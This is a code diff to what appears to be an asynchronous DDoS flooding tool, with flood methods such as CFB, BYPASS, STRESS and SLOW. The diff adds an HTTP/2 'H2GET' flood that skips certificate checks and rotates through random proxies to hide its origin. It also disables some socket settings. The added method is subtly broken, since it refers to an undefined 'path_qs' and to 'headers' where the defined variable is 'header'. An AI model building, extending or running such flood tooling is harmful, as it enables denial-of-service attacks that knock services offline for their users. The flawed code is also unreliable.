@@ -20,7 +20,7 @@ from OpenSSL import SSL
 from yarl import URL
 
 from . import proxy_proto
-from .proto import DatagramFloodIO, FloodIO, FloodOp, FloodSpec, FloodSpecType, TrexIO
+from .proto import DatagramFloodIO, FloodIO, FloodOp, FloodSpec, FloodSpecType, TrexIO, H2FloodIO
 from .proxies import NoProxySet, ProxySet
 from .targets import TargetStats
 from .vendor.referers import REFERERS
@@ -62,10 +62,19 @@ trex_ctx = SSL.Context(SSL.TLSv1_2_METHOD)
 trex_ctx.set_cipher_list(b"RSA")
 trex_ctx.set_verify(SSL.VERIFY_NONE, None)
 
+h2_ctx = create_default_context()
+h2_ctx.set_alpn_protocols(['h2'])
+h2_ctx.check_hostname = False
+try:
+    h2_ctx.server_hostname = ""
+except AttributeError:
+    pass
+h2_ctx.verify_mode = CERT_NONE
+
 
 class Methods:
     HTTP_METHODS: Set[str] = {
-        "CFB", "BYPASS", "GET", "RGET", "HEAD", "RHEAD", "POST", "STRESS", "DYN", "SLOW",
+        "CFB", "BYPASS", "GET", "H2GET", "RGET", "HEAD", "RHEAD", "POST", "STRESS", "DYN", "SLOW",
         "NULL", "COOKIE", "PPS", "EVEN", "AVB",
         "APACHE", "XMLRPC", "DOWNLOADER", "RHEX", "STOMP",
         # this is not HTTP method (rather TCP) but this way it works with --http-methods
@@ -306,6 +315,42 @@ class AsyncTcpFlood:
             conn = self._loop.create_connection(
                 flood_proto, host=proxy.proxy_host, port=proxy.proxy_port)
 
+        return await self._exec_proto(conn, on_connect, on_close)
+
+    async def H2GET(self, on_connect=None) -> bool:
+        path_qs = path_qs or self.default_path_qs
+        header = [
+            (':method', 'GET'),
+            (':path', path_qs),
+            (':authority', self._target.host),
+            (':scheme', 'https'),
+        ]
+        on_close = self._loop.create_future()
+        flood_proto = partial(H2FloodIO, self._loop, headers, on_close)
+        proxy_url: Optional[str] = self._proxies.pick_random()
+        server_hostname = ""
+        if proxy_url is None:
+            conn = self._loop.create_connection(
+                flood_proto,
+                host=self._addr,
+                port=self._target.port,
+                ssl=h2_ctx,
+                server_hostname=server_hostname
+            )
+        else:
+            proxy, proxy_protocol = proxy_proto.for_proxy(proxy_url)
+            flood_proto = partial(
+                proxy_protocol,
+                self._loop,
+                on_close,
+                self._raw_target,
+                h2_ctx,
+                downstream_factory=flood_proto,
+                connect_timeout=self._settings.dest_connect_timeout_seconds,
+                on_connect=on_connect,
+            )
+            conn = self._loop.create_connection(
+                flood_proto, host=proxy.proxy_host, port=proxy.proxy_port)
         return await self._exec_proto(conn, on_connect, on_close)
 
     async def GET(self, on_connect=None) -> bool:
@@ -610,10 +655,10 @@ class AsyncTcpFlood:
             async with async_timeout.timeout(self._settings.connect_timeout_seconds):
                 transport, _ = await conn
             sock = transport.get_extra_info("socket")
-            if sock and hasattr(sock, "setsockopt"):
-                sock.setsockopt(SOL_SOCKET, SO_RCVBUF, self._settings.socket_rcvbuf)
+            # if sock and hasattr(sock, "setsockopt"):
+                # sock.setsockopt(SOL_SOCKET, SO_RCVBUF, self._settings.socket_rcvbuf)
                 # the normal termination sequence SHOULD NOT to be initiated
-                sock.setsockopt(SOL_SOCKET, SO_LINGER, struct.pack("ii", 1, 0))
+                # sock.setsockopt(SOL_SOCKET, SO_LINGER, struct.pack("ii", 1, 0))
         except asyncio.CancelledError as e:
             if on_connect:
                 on_connect.cancel()
